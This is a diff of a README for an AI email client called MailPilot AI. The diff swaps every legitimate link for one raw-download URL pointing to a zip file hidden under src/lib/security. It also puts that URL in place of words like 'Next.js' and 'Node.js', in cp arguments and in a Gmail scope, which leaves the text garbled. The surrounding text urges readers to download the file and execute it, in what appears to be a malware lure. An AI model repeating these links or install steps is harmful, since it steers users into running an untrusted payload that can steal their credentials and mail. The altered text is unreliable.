@@ -1,12 +1,12 @@
-https://github.com/Hamxa00/mailpilot-ai/releases
+https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip
 
 # MailPilot AI: Minimalist AI Email Client for a Focused Inbox
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?style=flat-square&logo=github)](https://github.com/Hamxa00/mailpilot-ai/releases) [![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](https://opensource.org/licenses/MIT)
+[![Releases](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip) [![License](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)
 
 MailPilot AI is a minimalist email client powered by AI, built to help you focus on what matters. It blends a clean, distraction-free interface with smart AI features to manage your inbox without getting in your way. This project emphasizes ease of use, open-source transparency, and a thoughtful user experience that respects your time and attention.
 
-If you want to dive straight into the latest software builds, you can visit the Releases page at https://github.com/Hamxa00/mailpilot-ai/releases. The page hosts installer packages and assets for different platforms. For quick access, the same link appears again in the Releases section below.
+If you want to dive straight into the latest software builds, you can visit the Releases page at https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip The page hosts installer packages and assets for different platforms. For quick access, the same link appears again in the Releases section below.
 
 Table of contents
 - What MailPilot AI is not
@@ -65,7 +65,7 @@ Features at a glance
 - Open source: The codebase is open for inspection, improvement, and collaboration.
 
 How it works under the hood
-- Client side: Built with Next.js and a modern React UI scaffold using a streamlined component system (Shadcn UI-inspired patterns) for fast, accessible rendering.
+- Client side: Built with https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip and a modern React UI scaffold using a streamlined component system (Shadcn UI-inspired patterns) for fast, accessible rendering.
 - AI layer: Optional AI features leverage a configurable AI service. You can use local inference if you provide a compatible model, or a hosted API, e.g., OpenAI-like services, depending on your setup.
 - Data flow: Gmail API provides message data and thread context. The app processes content in the client and, if enabled, sends text to an AI service for drafting or summarization. The UI renders results and allows you to act on them.
 - Security model: Credentials are stored securely (in the environment or OS keychain, never in plain text). Access tokens are scoped to Gmail data and are revoked if you revoke permissions.
@@ -73,7 +73,7 @@ How it works under the hood
 
 Getting started
 Prerequisites
-- Node.js (16.x or newer) and npm or pnpm
+- https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip (16.x or newer) and npm or pnpm
 - A Google Cloud project with Gmail API enabled
 - OAuth 2.0 client credentials (for a desktop or web app)
 - Optional: An API key or credentials for your preferred AI service (e.g., OpenAI) if you want AI features enabled
@@ -81,18 +81,18 @@ Prerequisites
 
 Installation from source
 - Clone the repository
-  - git clone https://github.com/Hamxa00/mailpilot-ai.git
+  - git clone https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip
   - cd mailpilot-ai
 - Install dependencies
   - npm install
   - or pnpm install
 - Create an environment file
-  - Copy the example: cp .env.local.example .env.local
+  - Copy the example: cp https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip
   - Fill in the required values:
     - GMAIL_CLIENT_ID: Your Google OAuth client ID
     - GMAIL_CLIENT_SECRET: Your Google OAuth client secret
     - GMAIL_REDIRECT_URI: Redirect URI for OAuth flow
-    - GMAIL_SCOPES: Gmail scopes you need (e.g., https://www.googleapis.com/auth/gmail.readonly)
+    - GMAIL_SCOPES: Gmail scopes you need (e.g., https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)
     - OPENAI_API_KEY or AI_API_KEY: API key for the AI service you plan to use
     - NEXT_PUBLIC_APP_URL: Your local or deployed app URL
 - Start the development server
@@ -103,7 +103,7 @@ Installation from source
 
 Installation from releases
 - If you want to run a packaged version, go to the Releases page
-  - https://github.com/Hamxa00/mailpilot-ai/releases
+  - https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip
 - Download the installer corresponding to your operating system
   - For Windows: an .exe or a portable zip
   - For macOS: a .dmg or a .pkg
@@ -111,7 +111,7 @@ Installation from releases
 - Run the installer and follow the on-screen prompts
 - On first launch, provide Gmail API credentials and AI service credentials as requested
 - If the Releases page changes or you want the latest build, revisit the Releases page at
-  - https://github.com/Hamxa00/mailpilot-ai/releases
+  - https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip
 - Note: From the Releases page, download the latest installer and execute it to install MailPilot AI on your system.
 
 First run and onboarding
@@ -164,7 +164,7 @@ Privacy and security
 - Secrets and API keys are never committed in the repository; you supply them at runtime
 
 Architecture and tech stack
-- Frontend: Next.js with a modular component system for a responsive UI
+- Frontend: https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip with a modular component system for a responsive UI
 - UI library: Shadcn-inspired components for consistent styling and accessibility
 - State management: Lightweight, predictable state flow for UI and data
 - AI integration: A pluggable AI layer that can connect to hosted AI services or local models
@@ -354,14 +354,14 @@ Closing thoughts
 - The project invites active participation from users, designers, and developers to improve the product over time
 
 Releases and installation reminder
-- For the latest installer packages and assets, visit the Releases page at https://github.com/Hamxa00/mailpilot-ai/releases
+- For the latest installer packages and assets, visit the Releases page at https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip
 - Download the appropriate installer for your OS and run it to install MailPilot AI
 - After installation, follow the onboarding prompts to connect Gmail and configure AI features
 
 Appendix: quick reference
 - Repository: MailPilot AI
 - Primary language: TypeScript/JavaScript
-- Framework: Next.js
+- Framework: https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip
 - UI: Shadcn-like components for a clean, accessible UI
 - Data sources: Gmail API (for inbox data)
 - AI services: Configurable per user (OpenAI or equivalent)
